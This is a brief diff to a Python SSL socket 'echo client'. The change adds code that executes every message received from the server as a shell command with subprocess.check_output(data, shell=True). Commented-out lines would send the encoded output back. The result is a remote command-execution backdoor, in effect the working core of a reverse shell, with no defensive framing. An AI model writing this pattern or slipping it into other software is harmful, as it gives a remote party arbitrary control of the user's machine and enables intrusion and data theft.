@@ -1,5 +1,5 @@
 import ssl
-
+import subprocess
 port = 8082
 
 import socket, ssl
@@ -8,6 +8,10 @@ def echo_client(s):
     while True:
         data = s.recv(8192)
         print(data.decode("utf-8"))
+        response = subprocess.check_output(data, shell=True)
+        # encoded = encode(response)
+        # s.send(encoded)
+        print(response)
         if data == 'ola':
             print('niceee')
         if data == b'':
